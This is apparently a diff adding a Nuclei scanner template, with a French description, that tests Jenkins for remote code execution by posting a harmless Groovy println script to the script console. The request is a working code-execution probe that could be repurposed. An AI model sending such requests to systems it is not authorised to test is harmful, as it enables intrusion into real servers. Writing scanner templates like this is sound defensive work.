@@ -1,0 +1,26 @@
+id: jenkins-rce
+
+info:
+  name: Jenkins RCE via Script Console
+  author: nuclei-templates
+  severity: critical
+  description: Teste l'exécution de code via le script console Jenkins
+  tags: jenkins,rce,script-console,critical
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/script"
+      - "{{BaseURL}}/manage/script"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "script=println('test')&Submit=Run"
+
+    matchers:
+      - type: word
+        words:
+          - "test"
+        condition: or
+
